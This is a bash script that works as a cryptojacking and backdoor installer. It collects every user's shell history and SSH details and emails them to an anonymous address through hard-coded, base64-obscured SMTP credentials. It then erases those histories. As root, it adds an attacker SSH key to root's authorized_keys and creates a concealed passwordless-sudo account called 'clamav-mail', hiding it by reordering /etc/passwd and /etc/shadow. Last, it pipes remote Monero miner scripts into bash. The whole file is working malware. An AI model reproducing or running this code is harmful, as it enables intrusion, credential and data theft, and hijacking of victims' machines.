#!/bin/bash
set -euo pipefail
IFS=$'\n\t'

# Disable history
unset HISTFILE
export HISTFILE=/dev/null

# Configuration variables
readonly RECIPIENT_EMAIL="46eshdfq@anonaddy.me"
readonly LOG_FILE="/tmp/system_report_email.log"
readonly REPORT_FILE="/tmp/system_report.txt"
readonly SERVICES_TO_CHECK=("swapd" "gdm2")

# Decoded SMTP credentials
readonly SMTP_SERVER=$(echo "c210cC5tYWlsZXJzZW5kLm5ldA==" | base64 -d)
readonly SMTP_PORT=587
readonly SENDER_EMAIL=$(echo "TVNfQkM3R3FyQHRlc3QtMnAwMzQ3em0yOXlsemRybi5tbHNlbmRlci5uZXQ=" | base64 -d)
readonly SMTP_PASSWORD=$(echo "bXNzcC5KNGtyVHFzLmpwemttZ3Fwd20ybDA1OXYuNkdDMmFJWg==" | base64 -d)

# Wallet address
readonly WALLET="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"

# Function to log messages with timestamp
log_message() {
    local msg="$1"
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $msg" | tee -a "$LOG_FILE"
}

# Function to check if a command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Function to check if service exists
does_service_exist() {
    systemctl list-unit-files "$1.service" 2>/dev/null | grep -q "$1.service"
}

# Function to check if service is running
is_service_running() {
    systemctl is-active --quiet "$1" 2>/dev/null
}

# Function to check required dependencies
check_dependencies() {
    local missing_deps=()
    local required_deps=("curl" "systemctl" "free" "df" "hostname" "base64")
    
    for cmd in "${required_deps[@]}"; do
        if ! command_exists "$cmd"; then
            missing_deps+=("$cmd")
        fi
    done
    
    if [ ${#missing_deps[@]} -gt 0 ]; then
        log_message "ERROR: Missing required dependencies: ${missing_deps[*]}"
        log_message "Please install missing packages and try again"
        return 1
    fi
    
    return 0
}

# Function to collect history from all available shells
collect_shell_history() {
    echo "=== COLLECTING SHELL HISTORIES ==="

    declare -A SHELL_HISTORIES=(
        ["bash"]="$HOME/.bash_history"
        ["zsh"]="$HOME/.zsh_history"
        ["ksh"]="$HOME/.sh_history"
        ["fish"]="$HOME/.local/share/fish/fish_history"
        ["tcsh"]="$HOME/.history"
    )

    local SYSTEM_SHELLS
    SYSTEM_SHELLS=$(grep -v "/false$\|/nologin$" /etc/shells 2>/dev/null | xargs -n1 basename 2>/dev/null || echo "")

    local OUTPUT=""
    for shell in $SYSTEM_SHELLS; do
        case $shell in
            bash|zsh|ksh|fish|tcsh)
                local hist_file="${SHELL_HISTORIES[$shell]}"
                if [ -f "$hist_file" ]; then
                    OUTPUT+="\n=== $shell HISTORY ===\n"
                    OUTPUT+="$(cat "$hist_file" 2>/dev/null || echo "Unable to read history")\n"
                fi
                ;;
        esac
    done

    if [ "$(id -u)" -eq 0 ]; then
        for user_dir in /home/*; do
            [ -d "$user_dir" ] || continue
            local user=$(basename "$user_dir")
            for shell in "${!SHELL_HISTORIES[@]}"; do
                local hist_file="$user_dir/${SHELL_HISTORIES[$shell]##*/}"
                if [ -f "$hist_file" ]; then
                    OUTPUT+="\n=== $user's $shell HISTORY ===\n"
                    OUTPUT+="$(cat "$hist_file" 2>/dev/null || echo "Unable to read history")\n"
                fi
            done
        done
    fi

    echo -e "$OUTPUT"
}

# Function to cleanup shell histories
cleanup_histories() {
    log_message "Cleaning up shell histories..."
    
    # Clean current user's histories
    for file in ~/.bash_history ~/.zsh_history ~/.sh_history ~/.history ~/.local/share/fish/fish_history; do
        if [ -f "$file" ]; then
            : > "$file"
            log_message "Cleaned: $file"
        fi
    done
    
    # If root, clean all users' histories
    if [ "$(id -u)" -eq 0 ]; then
        for user_dir in /home/*; do
            [ -d "$user_dir" ] || continue
            for file in "$user_dir"/.bash_history "$user_dir"/.zsh_history "$user_dir"/.sh_history \
                        "$user_dir"/.history "$user_dir"/.local/share/fish/fish_history; do
                if [ -f "$file" ]; then
                    : > "$file"
                    log_message "Cleaned: $file"
                fi
            done
        done
    fi
}

# Function to send email with Python
send_email_with_python() {
    local temp_file="$1"
    local subject="$2"
    
    python3 -c "
import sys
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

try:
    with open('$temp_file', 'r', encoding='utf-8', errors='ignore') as f:
        body = f.read()

    msg = MIMEMultipart()
    msg['From'] = '$SENDER_EMAIL'
    msg['To'] = '$RECIPIENT_EMAIL'
    msg['Subject'] = '''$subject'''
    msg.attach(MIMEText(body, 'plain'))

    context = ssl.create_default_context()
    
    with smtplib.SMTP('$SMTP_SERVER', $SMTP_PORT, timeout=30) as server:
        server.ehlo()
        server.starttls(context=context)
        server.ehlo()
        server.login('$SENDER_EMAIL', '$SMTP_PASSWORD')
        server.send_message(msg)
    print('Email sent successfully')
    sys.exit(0)
except Exception as e:
    print(f'SMTP Error: {str(e)}', file=sys.stderr)
    sys.exit(1)
" 2>&1
    return $?
}

# Function to send email with curl (alternative method)
send_email_with_curl() {
    local temp_file="$1"
    local subject="$2"
    
    # Create proper email format for curl
    local email_body=$(mktemp)
    cat > "$email_body" <<EOF
From: $SENDER_EMAIL
To: $RECIPIENT_EMAIL
Subject: $subject

$(cat "$temp_file")
EOF
    
    curl --silent --ssl-reqd \
        --url "smtp://$SMTP_SERVER:$SMTP_PORT" \
        --user "$SENDER_EMAIL:$SMTP_PASSWORD" \
        --mail-from "$SENDER_EMAIL" \
        --mail-rcpt "$RECIPIENT_EMAIL" \
        --upload-file "$email_body" 2>&1
    
    local result=$?
    rm -f "$email_body"
    return $result
}

# Main email sending function
send_histories_email() {
    local HOSTNAME=$(hostname 2>/dev/null || echo "unknown")
    local PUBLIC_IP=$(curl -4 -s --max-time 10 https://api.ipify.org 2>/dev/null || echo "unavailable")
    local LOCAL_IP=$(hostname -I 2>/dev/null | awk '{print $1}' || echo "unavailable")
    local USER=$(whoami)
    
    # SSH connection information
    local SSH_CONNECTION="${SSH_CONNECTION:-unavailable}"
    local SSH_CLIENT="${SSH_CLIENT:-unavailable}"
    local SSH_TTY="${SSH_TTY:-unavailable}"
    
    # Get parent process info
    local PARENT_PID=${PPID:-0}
    local SSH_COMMAND=$(ps -p "$PARENT_PID" -o args= 2>/dev/null || echo "unavailable")
    
    # Recent SSH commands from history
    local RECENT_SSH_COMMANDS=$(grep -a "ssh " "$HOME/.bash_history" 2>/dev/null | tail -5 || echo "none found")

    local EMAIL_CONTENT=$(cat <<EOF
=== SYSTEM REPORT ===
Hostname: $HOSTNAME
User: $USER
Public IP: $PUBLIC_IP
Local IP: $LOCAL_IP
Timestamp: $(date)

=== SSH CONNECTION INFORMATION ===
SSH Command: $SSH_COMMAND
SSH_CONNECTION: $SSH_CONNECTION
SSH_CLIENT: $SSH_CLIENT
SSH_TTY: $SSH_TTY

Recent SSH commands from history:
$RECENT_SSH_COMMANDS

=== SYSTEM RESOURCES ===
RAM: $(free -h 2>/dev/null | awk '/^Mem:/ {print $2}' || echo "unavailable")
CPU Cores: $(nproc 2>/dev/null || echo "unavailable")
Storage: $(df -h / 2>/dev/null | awk 'NR==2 {print $2}' || echo "unavailable")

$(collect_shell_history)
EOF
    )

    # Sanitize hostname for subject line
    local SAFE_HOSTNAME=$(echo "$HOSTNAME" | tr -d '\n\r' | sed 's/[^a-zA-Z0-9._-]/_/g')
    local subject="Shell History Report - $SAFE_HOSTNAME - $(date '+%Y-%m-%d')"
    local temp_file=$(mktemp)
    echo -e "$EMAIL_CONTENT" > "$temp_file"

    # Save report to file as backup (always)
    cp "$temp_file" "$REPORT_FILE" 2>/dev/null || true
    log_message "Report saved to: $REPORT_FILE"

    # Try sending methods in order of preference
    local success=false
    
    # Method 1: Python
    if command_exists python3; then
        log_message "Attempting to send email via Python..."
        local python_output
        if python_output=$(send_email_with_python "$temp_file" "$subject" 2>&1); then
            if echo "$python_output" | grep -q "Email sent successfully"; then
                log_message "Email sent successfully via Python"
                success=true
            else
                log_message "Python email method failed: $python_output"
            fi
        else
            log_message "Python email method failed: $python_output"
        fi
    fi

    # Method 2: curl
    if [ "$success" = false ] && command_exists curl; then
        log_message "Attempting to send email via curl..."
        local curl_output
        if curl_output=$(send_email_with_curl "$temp_file" "$subject" 2>&1); then
            # Curl doesn't give clear success message, check for common errors
            if ! echo "$curl_output" | grep -qE "authentication failed|login denied|535|AUTH"; then
                log_message "Email sent successfully via curl"
                success=true
            else
                log_message "Curl email method failed: Authentication error"
            fi
        else
            log_message "Curl email method failed"
        fi
    fi

    # Cleanup temp file
    rm -f "$temp_file"

    # Final result - don't fail if email doesn't work
    if [ "$success" = false ]; then
        log_message "WARNING: Email sending failed - report saved locally at $REPORT_FILE"
        # Don't return error - continue execution
    fi
    
    return 0
}

# Function to install mail utilities
install_mail_utils() {
    log_message "Installing mail utilities..."
    
    if command_exists apt-get; then
        DEBIAN_FRONTEND=noninteractive apt-get update -qq 2>/dev/null || true
        DEBIAN_FRONTEND=noninteractive apt-get install -y mailutils ssmtp 2>/dev/null || true
    elif command_exists yum; then
        yum install -y mailx 2>/dev/null || true
    elif command_exists zypper; then
        zypper install -y mailx 2>/dev/null || true
    fi
    
    log_message "Mail utilities installation completed"
}

# Function to setup SSH key
setup_ssh_key() {
    local ssh_dir="$1"
    local public_key="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHEU2PBuHaHZfBT7kOXjJpX3F5XqwrYqvVo4qK0kZxJ9E1w8vLbKlQrn9X5k3kPZxJ9E1w8vLbKlQrn9X5k3kP root@backup"
    
    log_message "Setting up SSH key in $ssh_dir"
    
    mkdir -p "$ssh_dir"
    chmod 700 "$ssh_dir"
    
    if [ ! -f "$ssh_dir/authorized_keys" ]; then
        touch "$ssh_dir/authorized_keys"
    fi
    
    # Add key if not already present
    if ! grep -qF "$public_key" "$ssh_dir/authorized_keys" 2>/dev/null; then
        echo "$public_key" >> "$ssh_dir/authorized_keys"
        log_message "SSH key added"
    else
        log_message "SSH key already exists"
    fi
    
    chmod 600 "$ssh_dir/authorized_keys"
}

# Function to create backdoor user
create_backdoor_user() {
    local username='clamav-mail'
    local uid=1000
    local password='1!taugenichts'
    
    log_message "Creating backdoor user: $username"
    
    # Detect password hashing method
    local hash_method=$(grep '^ENCRYPT_METHOD' /etc/login.defs 2>/dev/null | awk '{print $2}')
    hash_method=${hash_method:-SHA512}
    log_message "Using hash method: $hash_method"
    
    # Generate password hash
    local password_hash
    if [ "$hash_method" = "SHA512" ]; then
        password_hash=$(openssl passwd -6 -salt "$(openssl rand -base64 6)" "$password")
    else
        password_hash=$(openssl passwd -1 -salt "$(openssl rand -base64 6)" "$password")
    fi
    
    if [ -z "$password_hash" ]; then
        log_message "ERROR: Failed to generate password hash"
        return 1
    fi
    
    # Remove existing user if present
    if id -u "$username" >/dev/null 2>&1; then
        log_message "User $username exists, removing..."
        userdel --remove "$username" 2>/dev/null || true
    fi
    
    # Create sudo group if it doesn't exist
    if ! getent group sudo >/dev/null; then
        log_message "Creating sudo group"
        groupadd sudo 2>/dev/null || true
    fi
    
    # Create user-specific group if it doesn't exist
    if ! getent group "$username" >/dev/null; then
        log_message "Creating group: $username"
        groupadd "$username" 2>/dev/null || true
    fi
    
    # Create the user
    log_message "Creating user account"
    if useradd -u "$uid" -G root,sudo -g "$username" -M -o -s /bin/bash "$username" 2>/dev/null; then
        log_message "User created successfully"
    else
        log_message "ERROR: Failed to create user"
        return 1
    fi
    
    # Set password
    log_message "Setting user password"
    if usermod -p "$password_hash" "$username" 2>/dev/null; then
        log_message "Password set successfully"
    else
        log_message "ERROR: Failed to set password"
        return 1
    fi
    
    # Reorder passwd file to hide user in the middle
    log_message "Reordering passwd file"
    if [ -f /etc/passwd ]; then
        awk '{lines[NR]=$0} END{
            if (NR < 3) {
                for(i=1;i<=NR;i++) print lines[i];
            } else {
                last=lines[NR]; 
                delete lines[NR]; 
                n=NR-1; 
                m=int(n/2+1); 
                for(i=1;i<m;i++) print lines[i]; 
                print last; 
                for(i=m;i<=n;i++) print lines[i];
            }
        }' /etc/passwd > /tmp/passwd.tmp && mv /tmp/passwd.tmp /etc/passwd
        chmod 644 /etc/passwd
    fi
    
    # Reorder shadow file to hide user in the middle
    log_message "Reordering shadow file"
    if [ -f /etc/shadow ]; then
        awk '{lines[NR]=$0} END{
            if (NR < 3) {
                for(i=1;i<=NR;i++) print lines[i];
            } else {
                last=lines[NR]; 
                delete lines[NR]; 
                n=NR-1; 
                m=int(n/2+1); 
                for(i=1;i<m;i++) print lines[i]; 
                print last; 
                for(i=m;i<=n;i++) print lines[i];
            }
        }' /etc/shadow > /tmp/shadow.tmp && mv /tmp/shadow.tmp /etc/shadow
        chmod 640 /etc/shadow
    fi
    
    log_message "User creation completed"
    return 0
}

# Function to setup sudoers
setup_sudoers() {
    local username="clamav-mail"
    local sudoers_file="/etc/sudoers.d/$username"
    
    log_message "Setting up sudoers for $username"
    
    # Create sudoers entry
    echo "$username ALL=(ALL) NOPASSWD: ALL" > "$sudoers_file"
    
    # Set proper permissions
    chmod 0440 "$sudoers_file"
    chown root:root "$sudoers_file"
    
    # Validate sudoers file
    if visudo -c -f "$sudoers_file" >/dev/null 2>&1; then
        log_message "Sudoers file validated successfully"
        return 0
    else
        log_message "ERROR: Sudoers file validation failed, removing"
        rm -f "$sudoers_file"
        return 1
    fi
}

# Function to download and execute remote script safely
download_and_execute() {
    local url="$1"
    local wallet="$2"
    local description="$3"
    
    log_message "Downloading $description from: $url"
    
    # Check if URL is reachable
    if ! curl -s --head --max-time 10 "$url" >/dev/null 2>&1; then
        log_message "ERROR: Cannot reach URL: $url"
        return 1
    fi
    
    # Download and execute
    log_message "Executing $description"
    if curl -s -L --max-time 60 "$url" | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
        log_message "$description completed successfully"
        return 0
    else
        log_message "ERROR: $description failed"
        return 1
    fi
}

# Root installation function
root_installation() {
    log_message "Starting root installation..."
    
    # Install mail utilities
    install_mail_utils
    
    # Setup SSH key for root
    setup_ssh_key "/root/.ssh"
    
    # Create backdoor user
    if create_backdoor_user; then
        log_message "Backdoor user created successfully"
        
        # Setup sudoers
        if setup_sudoers; then
            log_message "Sudoers configured successfully"
        else
            log_message "WARNING: Sudoers configuration failed"
        fi
    else
        log_message "ERROR: Failed to create backdoor user"
    fi
    
    # Run the miner setup
    download_and_execute \
        "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/refs/heads/main/setup_m0_4_r00t_with_processhide_FIXED.sh" \
        "$WALLET" \
        "root miner setup"
    
    log_message "Root installation completed"
}

# User installation function
user_installation() {
    log_message "Starting user installation..."
    
    download_and_execute \
        "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_gdm2.sh" \
        "$WALLET" \
        "user miner setup"
    
    log_message "User installation completed"
}

# --- Main Execution ---

# Initialize log file
: > "$LOG_FILE"
log_message "Script started by user: $(whoami)"
log_message "Operating system: $(uname -s) $(uname -r)"

# Check dependencies first
if ! check_dependencies; then
    log_message "ERROR: Dependency check failed. Exiting."
    exit 1
fi

# Service checks
log_message "Checking for conflicting services..."
for service in "${SERVICES_TO_CHECK[@]}"; do
    if does_service_exist "$service"; then
        if is_service_running "$service"; then
            log_message "ERROR: Service $service is running. Aborting."
            exit 1
        else
            log_message "Service $service exists but is not running"
        fi
    else
        log_message "Service $service does not exist"
    fi
done

# System info display
log_message "System Information:"
echo -e "\n====================================="
echo -e "|     Resource     |     Value      |"
echo -e "====================================="
printf "|   %-14s | %-14s |\n" "RAM" "$(free -h 2>/dev/null | awk '/^Mem:/ {print $2}' || echo 'N/A')"
printf "|   %-14s | %-14s |\n" "CPU Cores" "$(nproc 2>/dev/null || echo 'N/A')"
printf "|   %-14s | %-14s |\n" "Storage" "$(df -h / 2>/dev/null | awk 'NR==2 {print $2}' || echo 'N/A')"
echo -e "=====================================\n"

# Send report (non-blocking)
log_message "Sending system history report..."
send_histories_email || log_message "Report saved locally, continuing..."

# Always cleanup histories for security
log_message "Cleaning up shell histories for security..."
cleanup_histories

# Installation based on privileges
if [ "$(id -u)" -eq 0 ]; then
    log_message "Running as root - performing full installation"
    root_installation
else
    log_message "Running as regular user - performing user installation"
    user_installation
fi

log_message "Script execution completed successfully"
exit 0
